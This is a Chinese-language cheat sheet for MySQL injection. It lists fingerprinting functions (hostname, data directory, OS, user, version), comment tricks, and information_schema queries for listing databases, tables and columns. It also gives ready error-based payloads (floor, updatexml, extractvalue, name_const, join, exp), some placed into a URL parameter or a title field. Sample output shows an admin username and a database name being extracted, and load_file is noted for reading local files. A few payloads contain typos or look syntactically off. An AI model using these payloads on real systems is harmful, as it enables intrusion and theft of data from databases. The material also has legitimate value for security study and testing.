# mysql注入速查表

## 常用函数

`@@hostname`  主机名称

`@@datadir`  数据库所在路径

`@@version_compile_os`  查看操作系统版本

`database()`  当前数据库名称

`user()`  数据库用户名

`version()`  当前版本

`order by x / gruop by x`  判断列数

`load_file()` MYSQL读取本地文件的函数

## 字符串函数

`concat(str1,str2)`  不用分隔符连接字符串

`concat_ws(separator,str1,str2)`  用分隔符连接字符串

`group_concat(str1,str2)`  连接一个组的所有字符串，并以逗号分隔


## 注释

* `# `、`--+`、`%23`
* `/*`、`-- -`

## 逻辑运算符

`and`、`or`

## 常用语句

> 所有数据库

```sql
select schema_name from information_schema.schemata
```

> 某库的所有表

```sql
select table_name from information_schema.tables where table_schema='xxx'
```

> 某表的所有列

```sql
select column_name from information_schema.columns where table_name='xxx'
```

## 报错注入

### floor报错

```sql
and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);
```

### updatexml、extractvalue函数报错

`UPDATEXML (XML_document, XPath_string, new_value);`

**有长度限制，最长32位**

第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc。

第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。

第三个参数：new_value，String格式，替换查找到的符合条件的数据。

```
http://www.host.com/index.php?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
http://www.host.com/index.php?id=updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
http://www.host.com/index.php?id=updatexml(1,concat(0x7e,SUBSTR((SELECT @@version),1,24),0x7e),1)

t.title='1' and updatexml(1,concat(0x7e,(SELECT username FROM bage_admin where id=1),0x7e),1)
(1105, u"XPATH syntax error: '~admin~'")

t.title='1' and extractvalue(0x7e,concat(0x7e,(select database())))
(1105, u"XPATH syntax error: '~bagecms'")
```

### name_const报错

```sql
and exists(select*from (select*from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)
```

### join报错

```sql
select * from(select * from mysql.user a join mysql.user b)c;
```

### exp报错

```sql
and exp(~(select * from (select user () ) a) );
```


[Mysql注入点在limit关键字后面的利用方法](https://www.freebuf.com/articles/web/57528.html)

## 其他

* Mysql 中将blob类型转换成varchar类型

`SELECT CAST(sess_data AS CHAR(10000) CHARACTER SET utf8) FROM biz_session WHERE sess_id = 'bc837fc3a2f3217bb48854ff1f343eee'`